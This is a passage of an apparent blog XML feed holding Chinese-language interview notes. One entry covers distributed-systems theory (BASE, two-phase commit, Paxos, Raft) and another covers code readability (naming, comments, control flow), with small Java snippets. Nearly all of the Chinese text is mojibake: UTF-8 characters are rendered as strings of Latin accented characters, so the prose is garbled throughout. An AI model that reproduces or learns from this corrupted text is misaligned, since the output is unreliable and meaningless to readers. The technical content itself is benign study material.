Stateï¼‰å’Œæœ€ç»ˆä¸€è‡´æ€§ï¼ˆEventually Consistentï¼‰ä¸‰ä¸ªçŸ­è¯­çš„ç¼©å†™ã€‚ BASE ç†è®ºæ˜¯å¯¹ CAP ä¸­ä¸€è‡´æ€§å’Œå¯ç”¨æ€§æƒè¡¡çš„ç»“æœï¼Œå®ƒçš„ç†è®ºçš„æ ¸å¿ƒæ€æƒ³æ˜¯ï¼šå³ä½¿æ— æ³•åšåˆ°å¼ºä¸€è‡´æ€§ï¼Œä½†æ¯ä¸ªåº”ç”¨éƒ½å¯ä»¥æ ¹æ®è‡ªèº«ä¸šåŠ¡ç‰¹ç‚¹ï¼Œé‡‡ç”¨é€‚å½“çš„æ–¹å¼æ¥ä½¿ç³»ç»Ÿè¾¾åˆ°æœ€ç»ˆä¸€è‡´æ€§ã€‚ åŸºæœ¬å¯ç”¨æŒ‡åˆ†å¸ƒå¼ç³»ç»Ÿåœ¨å‡ºç°æ•…éšœçš„æ—¶å€™ï¼Œä¿è¯æ ¸å¿ƒå¯ç”¨ï¼Œå…è®¸æŸå¤±éƒ¨åˆ†å¯ç”¨æ€§ã€‚ ä¾‹å¦‚ï¼Œç”µå•†åœ¨åšä¿ƒé”€æ—¶ï¼Œä¸ºäº†ä¿è¯è´­ç‰©ç³»ç»Ÿçš„ç¨³å®šæ€§ï¼Œéƒ¨åˆ†æ¶ˆè´¹è€…å¯èƒ½ä¼šè¢«å¼•å¯¼åˆ°ä¸€ä¸ªé™çº§çš„é¡µé¢ã€‚ è½¯çŠ¶æ€æŒ‡å…è®¸ç³»ç»Ÿä¸­çš„æ•°æ®å­˜åœ¨ä¸­é—´çŠ¶æ€ï¼Œå¹¶è®¤ä¸ºè¯¥ä¸­é—´çŠ¶æ€ä¸ä¼šå½±å“ç³»ç»Ÿæ•´ä½“å¯ç”¨æ€§ï¼Œå³å…è®¸ç³»ç»Ÿä¸åŒèŠ‚ç‚¹çš„æ•°æ®å‰¯æœ¬ä¹‹é—´è¿›è¡ŒåŒæ­¥çš„è¿‡ç¨‹å­˜åœ¨å»¶æ—¶ã€‚ æœ€ç»ˆä¸€è‡´æ€§æœ€ç»ˆä¸€è‡´æ€§å¼ºè°ƒçš„æ˜¯ç³»ç»Ÿä¸­æ‰€æœ‰çš„æ•°æ®å‰¯æœ¬ï¼Œåœ¨ç»è¿‡ä¸€æ®µæ—¶é—´çš„åŒæ­¥åï¼Œæœ€ç»ˆèƒ½è¾¾åˆ°ä¸€è‡´çš„çŠ¶æ€ã€‚ ACID è¦æ±‚å¼ºä¸€è‡´æ€§ï¼Œé€šå¸¸è¿ç”¨åœ¨ä¼ ç»Ÿçš„æ•°æ®åº“ç³»ç»Ÿä¸Šã€‚è€Œ BASE è¦æ±‚æœ€ç»ˆä¸€è‡´æ€§ï¼Œé€šè¿‡ç‰ºç‰²å¼ºä¸€è‡´æ€§æ¥è¾¾åˆ°å¯ç”¨æ€§ï¼Œé€šå¸¸è¿ç”¨åœ¨å¤§å‹åˆ†å¸ƒå¼ç³»ç»Ÿä¸­ã€‚ åœ¨å®é™…çš„åˆ†å¸ƒå¼åœºæ™¯ä¸­ï¼Œä¸åŒä¸šåŠ¡å•å…ƒå’Œç»„ä»¶å¯¹ä¸€è‡´æ€§çš„è¦æ±‚æ˜¯ä¸åŒçš„ï¼Œå› æ­¤ ACID å’Œ BASE å¾€å¾€ä¼šç»“åˆåœ¨ä¸€èµ·ä½¿ç”¨ã€‚ ä¸‰ã€2PCä¸¤é˜¶æ®µæäº¤ï¼ˆTwo-phase Commitï¼Œ2PCï¼‰ ä¸»è¦ç”¨äºå®ç°åˆ†å¸ƒå¼äº‹åŠ¡ï¼Œåˆ†å¸ƒå¼äº‹åŠ¡æŒ‡çš„æ˜¯äº‹åŠ¡æ“ä½œè·¨è¶Šå¤šä¸ªèŠ‚ç‚¹ï¼Œå¹¶ä¸”è¦æ±‚æ»¡è¶³äº‹åŠ¡çš„ ACID ç‰¹æ€§ã€‚ é€šè¿‡å¼•å…¥åè°ƒè€…ï¼ˆCoordinatorï¼‰æ¥è°ƒåº¦å‚ä¸è€…çš„è¡Œä¸ºï¼Œï¼Œå¹¶æœ€ç»ˆå†³å®šè¿™äº›å‚ä¸è€…æ˜¯å¦è¦çœŸæ­£æ‰§è¡Œäº‹åŠ¡ã€‚ è¿è¡Œè¿‡ç¨‹1. å‡†å¤‡é˜¶æ®µåè°ƒè€…è¯¢é—®å‚ä¸è€…äº‹åŠ¡æ˜¯å¦æ‰§è¡ŒæˆåŠŸï¼Œå‚ä¸è€…å‘å›äº‹åŠ¡æ‰§è¡Œç»“æœã€‚ 2. æäº¤é˜¶æ®µå¦‚æœäº‹åŠ¡åœ¨æ¯ä¸ªå‚ä¸è€…ä¸Šéƒ½æ‰§è¡ŒæˆåŠŸï¼Œäº‹åŠ¡åè°ƒè€…å‘é€é€šçŸ¥è®©å‚ä¸è€…æäº¤äº‹åŠ¡ï¼›å¦åˆ™ï¼Œåè°ƒè€…å‘é€é€šçŸ¥è®©å‚ä¸è€…å›æ»šäº‹åŠ¡ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨å‡†å¤‡é˜¶æ®µï¼Œå‚ä¸è€…æ‰§è¡Œäº†äº‹åŠ¡ï¼Œä½†æ˜¯è¿˜æœªæäº¤ã€‚åªæœ‰åœ¨æäº¤é˜¶æ®µæ¥æ”¶åˆ°åè°ƒè€…å‘æ¥çš„é€šçŸ¥åï¼Œæ‰è¿›è¡Œæäº¤æˆ–è€…å›æ»šã€‚ å­˜åœ¨çš„é—®é¢˜1. åŒæ­¥é˜»å¡æ‰€æœ‰äº‹åŠ¡å‚ä¸è€…åœ¨ç­‰å¾…å…¶å®ƒå‚ä¸è€…å“åº”çš„æ—¶å€™éƒ½å¤„äºåŒæ­¥é˜»å¡çŠ¶æ€ï¼Œæ— æ³•è¿›è¡Œå…¶å®ƒæ“ä½œã€‚ 2. å•ç‚¹é—®é¢˜åè°ƒè€…åœ¨ 2PC ä¸­èµ·åˆ°éå¸¸å¤§çš„ä½œç”¨ï¼Œå‘ç”Ÿæ•…éšœå°†ä¼šé€ æˆå¾ˆå¤§å½±å“ï¼Œç‰¹åˆ«æ˜¯åœ¨é˜¶æ®µäºŒå‘ç”Ÿæ•…éšœï¼Œæ‰€æœ‰å‚ä¸è€…ä¼šä¸€ç›´ç­‰å¾…çŠ¶æ€ï¼Œæ— æ³•å®Œæˆå…¶å®ƒæ“ä½œã€‚ 3. æ•°æ®ä¸ä¸€è‡´åœ¨é˜¶æ®µäºŒï¼Œå¦‚æœåè°ƒè€…åªå‘é€äº†éƒ¨åˆ† Commit æ¶ˆæ¯ï¼Œæ­¤æ—¶ç½‘ç»œå‘ç”Ÿå¼‚å¸¸ï¼Œé‚£ä¹ˆåªæœ‰éƒ¨åˆ†å‚ä¸è€…æ¥æ”¶åˆ° Commit æ¶ˆæ¯ï¼Œä¹Ÿå°±æ˜¯è¯´åªæœ‰éƒ¨åˆ†å‚ä¸è€…æäº¤äº†äº‹åŠ¡ï¼Œä½¿å¾—ç³»ç»Ÿæ•°æ®ä¸ä¸€è‡´ã€‚ 4. å¤ªè¿‡ä¿å®ˆä»»æ„ä¸€ä¸ªèŠ‚ç‚¹å¤±è´¥å°±ä¼šå¯¼è‡´æ•´ä¸ªäº‹åŠ¡å¤±è´¥ï¼Œæ²¡æœ‰å®Œå–„çš„å®¹é”™æœºåˆ¶ã€‚ å››ã€Paxosç”¨äºè¾¾æˆå…±è¯†æ€§é—®é¢˜ï¼Œå³å¯¹å¤šä¸ªèŠ‚ç‚¹äº§ç”Ÿçš„å€¼ï¼Œè¯¥ç®—æ³•èƒ½ä¿è¯åªé€‰å‡ºå”¯ä¸€ä¸€ä¸ªå€¼ã€‚ ä¸»è¦æœ‰ä¸‰ç±»èŠ‚ç‚¹ï¼š æè®®è€…ï¼ˆProposerï¼‰ï¼šæè®®ä¸€ä¸ªå€¼ï¼› æ¥å—è€…ï¼ˆAcceptorï¼‰ï¼šå¯¹æ¯ä¸ªæè®®è¿›è¡ŒæŠ•ç¥¨ï¼› å‘ŠçŸ¥è€…ï¼ˆLearnerï¼‰ï¼šè¢«å‘ŠçŸ¥æŠ•ç¥¨çš„ç»“æœï¼Œä¸å‚ä¸æŠ•ç¥¨è¿‡ç¨‹ã€‚ æ‰§è¡Œè¿‡ç¨‹è§„å®šä¸€ä¸ªæè®®åŒ…å«ä¸¤ä¸ªå­—æ®µï¼š[n, v]ï¼Œå…¶ä¸­ n ä¸ºåºå·ï¼ˆå…·æœ‰å”¯ä¸€æ€§ï¼‰ï¼Œv ä¸ºæè®®å€¼ã€‚ ä¸‹å›¾æ¼”ç¤ºäº†ä¸¤ä¸ª Proposer å’Œä¸‰ä¸ª Acceptor çš„ç³»ç»Ÿä¸­è¿è¡Œè¯¥ç®—æ³•çš„åˆå§‹è¿‡ç¨‹ï¼Œæ¯ä¸ª Proposer éƒ½ä¼šå‘æ‰€æœ‰ Acceptor å‘é€æè®®è¯·æ±‚ã€‚ å½“ Acceptor æ¥æ”¶åˆ°ä¸€ä¸ªæè®®è¯·æ±‚ï¼ŒåŒ…å«çš„æè®®ä¸º [n1, v1]ï¼Œå¹¶ä¸”ä¹‹å‰è¿˜æœªæ¥æ”¶è¿‡æè®®è¯·æ±‚ï¼Œé‚£ä¹ˆå‘é€ä¸€ä¸ªæè®®å“åº”ï¼Œè®¾ç½®å½“å‰æ¥æ”¶åˆ°çš„æè®®ä¸º [n1, v1]ï¼Œå¹¶ä¸”ä¿è¯ä»¥åä¸ä¼šå†æ¥å—åºå·å°äº n1 çš„æè®®ã€‚ å¦‚ä¸‹å›¾ï¼ŒAcceptor X åœ¨æ”¶åˆ° [n=2, v=8] çš„æè®®è¯·æ±‚æ—¶ï¼Œç”±äºä¹‹å‰æ²¡æœ‰æ¥æ”¶è¿‡æè®®ï¼Œå› æ­¤å°±å‘é€ä¸€ä¸ª [no previous] çš„æè®®å“åº”ï¼Œè®¾ç½®å½“å‰æ¥æ”¶åˆ°çš„æè®®ä¸º [n=2, v=8]ï¼Œå¹¶ä¸”ä¿è¯ä»¥åä¸ä¼šå†æ¥å—åºå·å°äº 2 çš„æè®®ã€‚å…¶å®ƒçš„ Acceptor ç±»ä¼¼ã€‚ å¦‚æœ Acceptor æ¥æ”¶åˆ°ä¸€ä¸ªæè®®è¯·æ±‚ï¼ŒåŒ…å«çš„æè®®ä¸º [n2, v2]ï¼Œå¹¶ä¸”ä¹‹å‰å·²ç»æ¥æ”¶è¿‡æè®® [n1, v1]ã€‚å¦‚æœ n1 &gt; n2ï¼Œé‚£ä¹ˆå°±ä¸¢å¼ƒè¯¥æè®®è¯·æ±‚ï¼›å¦åˆ™ï¼Œå‘é€æè®®å“åº”ï¼Œè¯¥æè®®å“åº”åŒ…å«ä¹‹å‰å·²ç»æ¥æ”¶è¿‡çš„æè®® [n1, v1]ï¼Œè®¾ç½®å½“å‰æ¥æ”¶åˆ°çš„æè®®ä¸º [n2, v2]ï¼Œå¹¶ä¸”ä¿è¯ä»¥åä¸ä¼šå†æ¥å—åºå·å°äº n2 çš„æè®®ã€‚ å¦‚ä¸‹å›¾ï¼ŒAcceptor Z æ”¶åˆ° Proposer A å‘æ¥çš„ [n=2, v=8] çš„æè®®è¯·æ±‚ï¼Œç”±äºä¹‹å‰å·²ç»æ¥æ”¶è¿‡ [n=4, v=5] çš„æè®®ï¼Œå¹¶ä¸” n &gt; 2ï¼Œå› æ­¤å°±æŠ›å¼ƒè¯¥æè®®è¯·æ±‚ï¼›Acceptor X æ”¶åˆ° Proposer B å‘æ¥çš„ [n=4, v=5] çš„æè®®è¯·æ±‚ï¼Œå› ä¸ºä¹‹å‰æ¥æ”¶åˆ°çš„æè®®ä¸º [n=2, v=8]ï¼Œå¹¶ä¸” 2 &lt;= 4ï¼Œå› æ­¤å°±å‘é€ [n=2, v=8] çš„æè®®å“åº”ï¼Œè®¾ç½®å½“å‰æ¥æ”¶åˆ°çš„æè®®ä¸º [n=4, v=5]ï¼Œå¹¶ä¸”ä¿è¯ä»¥åä¸ä¼šå†æ¥å—åºå·å°äº 4 çš„æè®®ã€‚Acceptor Y ç±»ä¼¼ã€‚ å½“ä¸€ä¸ª Proposer æ¥æ”¶åˆ°è¶…è¿‡ä¸€åŠ Acceptor çš„æè®®å“åº”æ—¶ï¼Œå°±å¯ä»¥å‘é€æ¥å—è¯·æ±‚ã€‚ Proposer A æ¥æ”¶åˆ°ä¸¤ä¸ªæè®®å“åº”ä¹‹åï¼Œå°±å‘é€ [n=2, v=8] æ¥å—è¯·æ±‚ã€‚è¯¥æ¥å—è¯·æ±‚ä¼šè¢«æ‰€æœ‰ Acceptor ä¸¢å¼ƒï¼Œå› ä¸ºæ­¤æ—¶æ‰€æœ‰ Acceptor éƒ½ä¿è¯ä¸æ¥å—åºå·å°äº 4 çš„æè®®ã€‚ Proposer B è¿‡åä¹Ÿæ”¶åˆ°äº†ä¸¤ä¸ªæè®®å“åº”ï¼Œå› æ­¤ä¹Ÿå¼€å§‹å‘é€æ¥å—è¯·æ±‚ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ¥å—è¯·æ±‚çš„ v éœ€è¦å–å®ƒæ”¶åˆ°çš„æœ€å¤§ v å€¼ï¼Œä¹Ÿå°±æ˜¯ 8ã€‚å› æ­¤å®ƒå‘é€ [n=4, v=8] çš„æ¥å—è¯·æ±‚ã€‚ Acceptor æ¥æ”¶åˆ°æ¥å—è¯·æ±‚æ—¶ï¼Œå¦‚æœåºå·å¤§äºç­‰äºè¯¥ Acceptor æ‰¿è¯ºçš„æœ€å°åºå·ï¼Œé‚£ä¹ˆå°±å‘é€é€šçŸ¥ç»™æ‰€æœ‰çš„ Learnerã€‚å½“ Learner å‘ç°æœ‰å¤§å¤šæ•°çš„ Acceptor æ¥æ”¶äº†æŸä¸ªæè®®ï¼Œé‚£ä¹ˆè¯¥æè®®çš„æè®®å€¼å°±è¢« Paxos é€‰æ‹©å‡ºæ¥ã€‚ çº¦æŸæ¡ä»¶1. æ­£ç¡®æ€§æŒ‡åªæœ‰ä¸€ä¸ªæè®®å€¼ä¼šç”Ÿæ•ˆã€‚ å› ä¸º Paxos åè®®è¦æ±‚æ¯ä¸ªç”Ÿæ•ˆçš„æè®®è¢«å¤šæ•° Acceptor æ¥æ”¶ï¼Œå¹¶ä¸” Acceptor ä¸ä¼šæ¥å—ä¸¤ä¸ªä¸åŒçš„æè®®ï¼Œå› æ­¤å¯ä»¥ä¿è¯æ­£ç¡®æ€§ã€‚ 2. å¯ç»ˆæ­¢æ€§æŒ‡æœ€åæ€»ä¼šæœ‰ä¸€ä¸ªæè®®ç”Ÿæ•ˆã€‚ Paxos åè®®èƒ½å¤Ÿè®© Proposer å‘é€çš„æè®®æœç€èƒ½è¢«å¤§å¤šæ•° Acceptor æ¥å—çš„é‚£ä¸ªæè®®é æ‹¢ï¼Œå› æ­¤èƒ½å¤Ÿä¿è¯å¯ç»ˆæ­¢æ€§ã€‚ äº”ã€RaftRaft å’Œ Paxos ç±»ä¼¼ï¼Œä½†æ˜¯æ›´å®¹æ˜“ç†è§£ï¼Œä¹Ÿæ›´å®¹æ˜“å®ç°ã€‚ Raft ä¸»è¦æ˜¯ç”¨æ¥ç«é€‰ä¸»èŠ‚ç‚¹ã€‚ å•ä¸ª Candidate çš„ç«é€‰æœ‰ä¸‰ç§èŠ‚ç‚¹ï¼šFollowerã€Candidate å’Œ Leaderã€‚Leader ä¼šå‘¨æœŸæ€§çš„å‘é€å¿ƒè·³åŒ…ç»™ Followerã€‚æ¯ä¸ª Follower éƒ½è®¾ç½®äº†ä¸€ä¸ªéšæœºçš„ç«é€‰è¶…æ—¶æ—¶é—´ï¼Œä¸€èˆ¬ä¸º 150ms~300msï¼Œå¦‚æœåœ¨è¿™ä¸ªæ—¶é—´å†…æ²¡æœ‰æ”¶åˆ° Leader çš„å¿ƒè·³åŒ…ï¼Œå°±ä¼šå˜æˆ Candidateï¼Œè¿›å…¥ç«é€‰é˜¶æ®µã€‚ ä¸‹å›¾è¡¨ç¤ºä¸€ä¸ªåˆ†å¸ƒå¼ç³»ç»Ÿçš„æœ€åˆé˜¶æ®µï¼Œæ­¤æ—¶åªæœ‰ Followerï¼Œæ²¡æœ‰ Leaderã€‚Follower A ç­‰å¾…ä¸€ä¸ªéšæœºçš„ç«é€‰è¶…æ—¶æ—¶é—´ä¹‹åï¼Œæ²¡æ”¶åˆ° Leader å‘æ¥çš„å¿ƒè·³åŒ…ï¼Œå› æ­¤è¿›å…¥ç«é€‰é˜¶æ®µã€‚ æ­¤æ—¶ A å‘é€æŠ•ç¥¨è¯·æ±‚ç»™å…¶å®ƒæ‰€æœ‰èŠ‚ç‚¹ã€‚ å…¶å®ƒèŠ‚ç‚¹ä¼šå¯¹è¯·æ±‚è¿›è¡Œå›å¤ï¼Œå¦‚æœè¶…è¿‡ä¸€åŠçš„èŠ‚ç‚¹å›å¤äº†ï¼Œé‚£ä¹ˆè¯¥ Candidate å°±ä¼šå˜æˆ Leaderã€‚ ä¹‹å Leader ä¼šå‘¨æœŸæ€§åœ°å‘é€å¿ƒè·³åŒ…ç»™ Followerï¼ŒFollower æ¥æ”¶åˆ°å¿ƒè·³åŒ…ï¼Œä¼šé‡æ–°å¼€å§‹è®¡æ—¶ã€‚ å¤šä¸ª Candidate ç«é€‰ å¦‚æœæœ‰å¤šä¸ª Follower æˆä¸º Candidateï¼Œå¹¶ä¸”æ‰€è·å¾—ç¥¨æ•°ç›¸åŒï¼Œé‚£ä¹ˆå°±éœ€è¦é‡æ–°å¼€å§‹æŠ•ç¥¨ï¼Œä¾‹å¦‚ä¸‹å›¾ä¸­ Candidate B å’Œ Candidate D éƒ½è·å¾—ä¸¤ç¥¨ï¼Œå› æ­¤éœ€è¦é‡æ–°å¼€å§‹æŠ•ç¥¨ã€‚ å½“é‡æ–°å¼€å§‹æŠ•ç¥¨æ—¶ï¼Œç”±äºæ¯ä¸ªèŠ‚ç‚¹è®¾ç½®çš„éšæœºç«é€‰è¶…æ—¶æ—¶é—´ä¸åŒï¼Œå› æ­¤èƒ½ä¸‹ä¸€æ¬¡å†æ¬¡å‡ºç°å¤šä¸ª Candidate å¹¶è·å¾—åŒæ ·ç¥¨æ•°çš„æ¦‚ç‡å¾ˆä½ã€‚ æ—¥å¿—å¤åˆ¶ æ¥è‡ªå®¢æˆ·ç«¯çš„ä¿®æ”¹éƒ½ä¼šè¢«ä¼ å…¥ Leaderã€‚æ³¨æ„è¯¥ä¿®æ”¹è¿˜æœªè¢«æäº¤ï¼Œåªæ˜¯å†™å…¥æ—¥å¿—ä¸­ã€‚ Leader ä¼šæŠŠä¿®æ”¹å¤åˆ¶åˆ°æ‰€æœ‰ Followerã€‚ Leader ä¼šç­‰å¾…å¤§å¤šæ•°çš„ Follower ä¹Ÿè¿›è¡Œäº†ä¿®æ”¹ï¼Œç„¶åæ‰å°†ä¿®æ”¹æäº¤ã€‚ æ­¤æ—¶ Leader ä¼šé€šçŸ¥çš„æ‰€æœ‰ Follower è®©å®ƒä»¬ä¹Ÿæäº¤ä¿®æ”¹ï¼Œæ­¤æ—¶æ‰€æœ‰èŠ‚ç‚¹çš„å€¼è¾¾æˆä¸€è‡´ã€‚ å‚è€ƒèµ„æ–™ å€ªè¶…. ä» Paxos åˆ° ZooKeeper : åˆ†å¸ƒå¼ä¸€è‡´æ€§åŸç†ä¸å®è·µ [M]. ç”µå­å·¥ä¸šå‡ºç‰ˆç¤¾, 2015. What is CAP theorem in distributed database system? NEAT ALGORITHMS - PAXOS Raft: Understandable Distributed Consensus Paxos By Example]]></content>
      <categories>
        <category>Github</category>
        <category>Interview-Notebook</category>
      </categories>
      <tags>
        <tag>æŠ€æœ¯</tag>
        <tag>Java</tag>
        <tag>è½¬è½½</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä»£ç å¯è¯»æ€§]]></title>
    <url>%2F2018%2F07%2F04%2FJava%2FInterview%2FInterview-Notebook%2F%E4%BB%A3%E7%A0%81%E5%8F%AF%E8%AF%BB%E6%80%A7%2F</url>
    <content type="text"><![CDATA[ä¸€ã€å¯è¯»æ€§çš„é‡è¦æ€§ äºŒã€ç”¨åå­—è¡¨è¾¾ä»£ç å«ä¹‰ ä¸‰ã€åå­—ä¸èƒ½å¸¦æ¥æ­§ä¹‰ å››ã€è‰¯å¥½çš„ä»£ç é£æ ¼ äº”ã€ä¸ºä½•ç¼–å†™æ³¨é‡Š å…­ã€å¦‚ä½•ç¼–å†™æ³¨é‡Š ä¸ƒã€æé«˜æ§åˆ¶æµçš„å¯è¯»æ€§ å…«ã€æ‹†åˆ†é•¿è¡¨è¾¾å¼ ä¹ã€å˜é‡ä¸å¯è¯»æ€§ åã€æŠ½å–å‡½æ•° åä¸€ã€ä¸€æ¬¡åªåšä¸€ä»¶äº‹ åäºŒã€ç”¨è‡ªç„¶è¯­è¨€è¡¨è¿°ä»£ç  åä¸‰ã€å‡å°‘ä»£ç é‡ å‚è€ƒèµ„æ–™ ä¸€ã€å¯è¯»æ€§çš„é‡è¦æ€§ç¼–ç¨‹æœ‰å¾ˆå¤§ä¸€éƒ¨åˆ†æ—¶é—´æ˜¯åœ¨é˜…è¯»ä»£ç ï¼Œä¸ä»…è¦é˜…è¯»è‡ªå·±çš„ä»£ç ï¼Œè€Œä¸”è¦é˜…è¯»åˆ«äººçš„ä»£ç ã€‚å› æ­¤ï¼Œå¯è¯»æ€§è‰¯å¥½çš„ä»£ç èƒ½å¤Ÿå¤§å¤§æé«˜ç¼–ç¨‹æ•ˆç‡ã€‚ å¯è¯»æ€§è‰¯å¥½çš„ä»£ç å¾€å¾€ä¼šè®©ä»£ç æ¶æ„æ›´å¥½ï¼Œå› ä¸ºç¨‹åºå‘˜æ›´æ„¿æ„å»ä¿®æ”¹è¿™éƒ¨åˆ†ä»£ç ï¼Œè€Œä¸”ä¹Ÿæ›´å®¹æ˜“ä¿®æ”¹ã€‚ åªæœ‰åœ¨æ ¸å¿ƒé¢†åŸŸä¸ºäº†æ•ˆç‡æ‰å¯ä»¥æ”¾å¼ƒå¯è¯»æ€§ï¼Œå¦åˆ™å¯è¯»æ€§æ˜¯ç¬¬ä¸€ä½ã€‚ äºŒã€ç”¨åå­—è¡¨è¾¾ä»£ç å«ä¹‰ä¸€äº›æ¯”è¾ƒæœ‰è¡¨è¾¾åŠ›çš„å•è¯ï¼š å•è¯ å¯æ›¿ä»£å•è¯ send deliverã€dispatchã€announceã€distributeã€route find searchã€extractã€locateã€recover start launchã€createã€beginã€open make createã€set upã€buildã€generateã€composeã€addã€new ä½¿ç”¨ iã€jã€k ä½œä¸ºå¾ªç¯è¿­ä»£å™¨çš„åå­—è¿‡äºç®€å•ï¼Œuser_iã€member_i è¿™ç§åå­—ä¼šæ›´æœ‰è¡¨è¾¾åŠ›ã€‚å› ä¸ºå¾ªç¯å±‚æ¬¡è¶Šå¤šï¼Œä»£ç è¶Šéš¾ç†è§£ï¼Œæœ‰è¡¨è¾¾åŠ›çš„è¿­ä»£å™¨åå­—å¯è¯»æ€§ä¼šæ›´é«˜ã€‚ ä¸ºåå­—æ·»åŠ å½¢å®¹è¯ç­‰ä¿¡æ¯èƒ½è®©åå­—æ›´å…·æœ‰è¡¨è¾¾åŠ›ï¼Œä½†æ˜¯åå­—ä¹Ÿä¼šå˜é•¿ã€‚åå­—é•¿çŸ­çš„å‡†åˆ™æ˜¯ï¼šä½œç”¨åŸŸè¶Šå¤§ï¼Œåå­—è¶Šé•¿ã€‚å› æ­¤åªæœ‰åœ¨çŸ­ä½œç”¨åŸŸæ‰èƒ½ä½¿ç”¨ä¸€äº›ç®€å•åå­—ã€‚ ä¸‰ã€åå­—ä¸èƒ½å¸¦æ¥æ­§ä¹‰èµ·å®Œåå­—è¦æ€è€ƒä¸€ä¸‹åˆ«äººä¼šå¯¹è¿™ä¸ªåå­—æœ‰ä½•è§£è¯»ï¼Œä¼šä¸ä¼šè¯¯è§£äº†åŸæœ¬æƒ³è¡¨è¾¾çš„å«ä¹‰ã€‚ å¸ƒå°”ç›¸å…³çš„å‘½ååŠ ä¸Š isã€canã€shouldã€has ç­‰å‰ç¼€ã€‚ ç”¨ minã€max è¡¨ç¤ºæ•°é‡èŒƒå›´ï¼› ç”¨ firstã€last è¡¨ç¤ºè®¿é—®ç©ºé—´çš„åŒ…å«èŒƒå›´ï¼› beginã€end è¡¨ç¤ºè®¿é—®ç©ºé—´çš„æ’é™¤èŒƒå›´ï¼Œå³ end ä¸åŒ…å«å°¾éƒ¨ã€‚ å››ã€è‰¯å¥½çš„ä»£ç é£æ ¼é€‚å½“çš„ç©ºè¡Œå’Œç¼©è¿›ã€‚ æ’åˆ—æ•´é½çš„æ³¨é‡Šï¼š 123int a = 1; // æ³¨é‡Šint b = 11; // æ³¨é‡Šint c = 111; // æ³¨é‡Š è¯­å¥é¡ºåºä¸èƒ½éšæ„ï¼Œæ¯”å¦‚ä¸ html è¡¨å•ç›¸å…³è”çš„å˜é‡çš„èµ‹å€¼åº”è¯¥å’Œè¡¨å•åœ¨ html ä¸­çš„é¡ºåºä¸€è‡´ã€‚ äº”ã€ä¸ºä½•ç¼–å†™æ³¨é‡Šé˜…è¯»ä»£ç é¦–å…ˆä¼šæ³¨æ„åˆ°æ³¨é‡Šï¼Œå¦‚æœæ³¨é‡Šæ²¡å¤ªå¤§ä½œç”¨ï¼Œé‚£ä¹ˆå°±ä¼šæµªè´¹ä»£ç é˜…è¯»çš„æ—¶é—´ã€‚é‚£äº›èƒ½ç›´æ¥çœ‹å‡ºå«ä¹‰çš„ä»£ç ä¸éœ€è¦å†™æ³¨é‡Šï¼Œç‰¹åˆ«æ˜¯å¹¶ä¸éœ€è¦ä¸ºæ¯ä¸ªæ–¹æ³•éƒ½åŠ ä¸Šæ³¨é‡Šï¼Œæ¯”å¦‚é‚£äº›ç®€å•çš„ getter å’Œ setter æ–¹æ³•ï¼Œä¸ºè¿™äº›æ–¹æ³•å†™æ³¨é‡Šåè€Œè®©ä»£ç å¯è¯»æ€§æ›´å·®ã€‚ ä¸èƒ½å› ä¸ºæœ‰æ³¨é‡Šå°±éšä¾¿èµ·ä¸ªåå­—ï¼Œè€Œæ˜¯äº‰å–èµ·ä¸ªå¥½åå­—è€Œä¸å†™æ³¨é‡Šã€‚ å¯ä»¥ç”¨æ³¨é‡Šæ¥è®°å½•é‡‡ç”¨å½“å‰è§£å†³åŠæ³•çš„æ€è€ƒè¿‡ç¨‹ï¼Œä»è€Œè®©è¯»è€…æ›´å®¹æ˜“ç†è§£ä»£ç ã€‚ æ³¨é‡Šç”¨æ¥æé†’ä¸€äº›ç‰¹æ®Šæƒ…å†µã€‚ ç”¨ TODO ç­‰åšæ ‡è®°ï¼š æ ‡è®° ç”¨æ³• TODO å¾…åš FIXME å¾…ä¿®å¤ HACK ç²—ç³™çš„è§£å†³æ–¹æ¡ˆ XXX å±é™©ï¼è¿™é‡Œæœ‰é‡è¦çš„é—®é¢˜ å…­ã€å¦‚ä½•ç¼–å†™æ³¨é‡Šå°½é‡ç®€æ´æ˜äº†ï¼š 123// The first String is student's name// The Second Integer is student's scoreMap&lt;String, Integer&gt; scoreMap = new HashMap&lt;&gt;(); 12// Student's name -&gt; Student's scoreMap&lt;String, Integer&gt; scoreMap = new HashMap&lt;&gt;(); æ·»åŠ æµ‹è¯•ç”¨ä¾‹æ¥è¯´æ˜ï¼š 12345// ...// Example: add(1, 2), return 3int add(int x, int y) &#123; return x + y;&#125; ä½¿ç”¨ä¸“ä¸šåè¯æ¥ç¼©çŸ­æ¦‚å¿µä¸Šçš„è§£é‡Šï¼Œæ¯”å¦‚ç”¨è®¾è®¡æ¨¡å¼åæ¥è¯´æ˜ä»£ç ã€‚ ä¸ƒã€æé«˜æ§åˆ¶æµçš„å¯è¯»æ€§æ¡ä»¶è¡¨è¾¾å¼ä¸­ï¼Œå·¦ä¾§æ˜¯å˜é‡ï¼Œå³ä¾§æ˜¯å¸¸æ•°ã€‚æ¯”å¦‚ä¸‹é¢ç¬¬ä¸€ä¸ªè¯­å¥æ­£ç¡®ï¼š 12if (len &lt; 10)if (10 &gt; len) åªæœ‰åœ¨é€»è¾‘ç®€å•çš„æƒ…å†µä¸‹ä½¿ç”¨ ? : ä¸‰ç›®è¿ç®—ç¬¦æ¥ä½¿ä»£ç æ›´ç´§å‡‘ï¼Œå¦åˆ™åº”è¯¥æ‹†åˆ†æˆ if / elseï¼› do / while çš„æ¡ä»¶æ”¾åœ¨åé¢ï¼Œä¸å¤Ÿç®€å•æ˜äº†ï¼Œå¹¶ä¸”ä¼šæœ‰ä¸€äº›è¿·æƒ‘çš„åœ°æ–¹ï¼Œæœ€å¥½ä½¿ç”¨ while æ¥ä»£æ›¿ã€‚ å¦‚æœåªæœ‰ä¸€ä¸ª goto ç›®æ ‡ï¼Œé‚£ä¹ˆ goto å°šä¸”è¿˜èƒ½æ¥å—ï¼Œä½†æ˜¯è¿‡äºå¤æ‚çš„ goto ä¼šè®©ä»£ç å¯è¯»æ€§ç‰¹åˆ«å·®ï¼Œåº”è¯¥é¿å…ä½¿ç”¨ gotoã€‚ åœ¨åµŒå¥—çš„å¾ªç¯ä¸­ï¼Œç”¨ä¸€äº› return è¯­å¥å¾€å¾€èƒ½å‡å°‘åµŒå¥—çš„å±‚æ•°ã€‚ 